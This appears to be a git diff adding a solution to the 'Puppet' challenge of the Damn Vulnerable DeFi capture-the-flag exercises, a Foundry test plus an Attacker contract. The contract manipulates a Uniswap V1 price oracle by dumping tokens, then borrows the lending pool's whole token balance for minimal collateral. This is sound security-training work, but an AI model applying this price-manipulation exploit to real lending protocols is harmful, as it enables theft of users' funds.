@@ -92,7 +92,10 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // @note price-manipulation attack here
+        Attacker attacker = new Attacker{value: 25e18}(token, lendingPool, uniswapV1Exchange, recovery);
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+        attacker.startAttack();
     }
 
     // Utility function to calculate Uniswap prices
@@ -116,3 +119,28 @@ contract PuppetChallenge is Test {
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+    contract Attacker {
+
+        DamnValuableToken token;
+        PuppetPool pool;
+        IUniswapV1Exchange exchange;
+        address recovery;
+        uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+        
+        constructor(DamnValuableToken _token, PuppetPool _pool, IUniswapV1Exchange _exchange, address _recovery) payable {
+            token = _token;
+            pool = _pool;
+            exchange = _exchange;
+            recovery = _recovery;
+        }
+
+        function startAttack() public {
+            token.approve(address(exchange), 1000e18);
+            exchange.tokenToEthSwapInput(1000e18, 1e18, block.timestamp + 1 days);
+            uint256 collateralRequired = pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+            pool.borrow{value: collateralRequired}(POOL_INITIAL_TOKEN_BALANCE, recovery);
+        }
+
+        receive() external payable{}
+    }
